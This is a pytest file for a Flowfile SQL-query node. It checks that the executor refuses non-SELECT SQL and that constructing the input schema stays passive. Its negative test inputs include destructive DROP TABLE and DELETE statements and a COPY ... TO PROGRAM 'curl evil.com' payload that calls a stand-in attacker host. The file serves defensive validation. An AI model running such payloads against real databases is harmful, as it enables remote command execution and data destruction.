"""Tests for SQL query validation in the sql_query node

Ensures that ``execute_sql_query`` refuses unsafe SQL before it reaches
``pl.SQLContext``. Validation lives at the executor seam, not on the
``SqlQueryInput`` schema — schema construction is intentionally passive so
non-AI callers can draft/inspect SQL without hitting the gate prematurely.
"""

from __future__ import annotations

import polars as pl
import pytest

from flowfile_core.flowfile.flow_data_engine.flow_data_engine import (
    FlowDataEngine,
    execute_sql_query,
)
from flowfile_core.flowfile.sources.external_sources.sql_source.sql_source import UnsafeSQLError
from flowfile_core.schemas.transform_schema import SqlQueryInput


class TestSqlQueryNodeValidation:
    """Validates that the sql_query node refuses dangerous SQL."""

    @pytest.fixture()
    def sample_engine(self) -> FlowDataEngine:
        lf = pl.LazyFrame({"id": [1, 2, 3], "name": ["a", "b", "c"]})
        return FlowDataEngine(lf)

    def test_drop_table_refused_in_execute(self, sample_engine: FlowDataEngine) -> None:
        with pytest.raises(UnsafeSQLError, match="Only SELECT queries"):
            execute_sql_query(sample_engine, sql_code="DROP TABLE input_1")

    def test_delete_refused_in_execute(self, sample_engine: FlowDataEngine) -> None:
        with pytest.raises(UnsafeSQLError, match="Only SELECT queries"):
            execute_sql_query(sample_engine, sql_code="DELETE FROM input_1 WHERE id = 1")

    def test_copy_refused_in_execute(self, sample_engine: FlowDataEngine) -> None:
        with pytest.raises(UnsafeSQLError):
            execute_sql_query(sample_engine, sql_code="COPY (SELECT * FROM input_1) TO PROGRAM 'curl evil.com'")

    def test_valid_select_passes(self, sample_engine: FlowDataEngine) -> None:
        result = execute_sql_query(sample_engine, sql_code="SELECT * FROM input_1")
        assert result.data_frame.collect().shape[0] == 3

    def test_schema_construction_is_passive(self) -> None:
        """Constructing ``SqlQueryInput`` does not validate — gate lives at execute."""
        inp = SqlQueryInput(sql_code="DROP TABLE users")
        assert inp.sql_code == "DROP TABLE users"

    def test_schema_accepts_select(self) -> None:
        inp = SqlQueryInput(sql_code="SELECT id, name FROM users")
        assert inp.sql_code == "SELECT id, name FROM users"
